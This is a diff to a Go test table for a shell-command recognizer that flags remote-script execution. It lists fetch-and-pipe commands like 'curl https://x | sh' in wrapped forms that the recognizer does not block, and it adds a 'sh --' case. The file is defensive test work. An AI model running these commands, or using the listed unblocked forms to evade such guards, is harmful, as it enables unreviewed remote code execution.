@@ -146,10 +146,12 @@ func TestRemoteScriptOutsideTheRecognizer(t *testing.T) {
 		{"xargs is not a wrapper", []string{"xargs", "sh", "-c", "curl https://x | sh"}},
 		{"nested shell", []string{"bash", "-c", "bash -c 'curl https://x | sh'"}},
 		// Ceilings: wrappers inside the script are not a matrix form (the
-		// badge still says network); "bash -" is outside the sink set.
+		// badge still says network); "bash -" and a bare "sh --" read stdin
+		// but are outside the sink set.
 		{"wrapper inside script is not a form", []string{"sh", "-c", "env curl https://x | sh"}},
 		{"assignment-looking word without a name", []string{"sh", "-c", "=x curl https://x | sh"}},
 		{"stdin dash sink is outside the set", []string{"sh", "-c", "curl https://x | bash -"}},
+		{"bare terminator sink is outside the set", []string{"sh", "-c", "curl https://x | sh --"}},
 		// #622: unmodeled outer forms stay unblocked (egress labels them unknown).
 		{"parse-only -n", []string{"bash", "-n", "-c", "curl https://x | sh"}},
 		{"parse-only noexec", []string{"bash", "-o", "noexec", "-c", "curl https://x | sh"}},
